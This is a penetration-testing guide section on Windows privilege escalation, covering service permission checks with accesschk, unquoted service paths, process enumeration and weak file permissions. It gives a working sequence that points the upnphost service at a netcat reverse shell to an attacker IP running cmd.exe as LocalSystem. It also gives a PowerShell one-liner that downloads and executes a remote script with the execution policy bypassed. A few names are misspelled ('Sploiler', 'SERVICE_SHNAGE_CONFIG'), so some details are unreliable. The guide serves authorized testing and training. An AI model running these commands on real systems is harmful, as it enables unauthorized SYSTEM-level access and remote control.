# Windows Services
Next, we can try Microsoft Windows Services with the following command,
```
C:> sc qc Sploiler
```
If we upload a copy of the `accesschk.exe` binary from [Microsoft SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) we can check alot of permissions for services. For instance,
```
C:> accesschk.exe /accepteula -ucqv Spooler
```
will list the Spooler service and it's permissions. To list all services, simply use an asterisk,
```
C:> accesschk.exe /accepteula -ucqv *
```
We can use it to check for write access to a service with the following DOS command,
```
C:> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
Now, let's try it in practice. First a few things need to be in order. We must,
1. Have a space to read and write 
2. Upload the Windows binary of Netcat to the target `/usr/share/binaries/windows` in Kali.
```
C:\> sc qc upnphost
C:\> sc config upnphost binpath= "C:\temp\nc.exe -nv (ATTACKER IP ADDRESS) (ATTACKER PORT) -e C:\WINDOWS\System32\cmd.exe"
C:\> sc config upnphost obj= ".\LocalSystem" password= ""
C:\> sc qc upnphost
C:\> net start upnphost # start the service
```
The access rights that we are looking for in the service to fully exploit it are,
* SERVICE_SHNAGE_CONFIG
* WRITE_DAC
* WRITE_OWNER
* GENERIC_WRITE
* GENERIC_ALL
The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.

Do any services have unquoted paths with spaces?
```
C:> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:windows\" |findstr /i /v """
C:> gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
## Windows Processes
We can gather information on the currently-running processes with the following commands,
```
C:> tasklist /v
C:> tasklist /v /fi "username eq system"
C:> net start
C:> sc query
PS> Get-Service
PS> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
PS> REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```
Search for weak services using [PowerUp Power Shell](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps) script,
```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```
## Weak File Permissions
We can also use `accesschk.exe` to determine which files in the target system have weak permissions. You can get Accesschk.exe from [this repository](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/windows-binaries/accesschk.exe)
```
C:> accesschk.exe -uwdqs Users c:\
C:> accesschk.exe -uwdqs "Authenticated Users" c:\
C:> accesschk.exe -uwqs Users c:\*.*
C:> accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
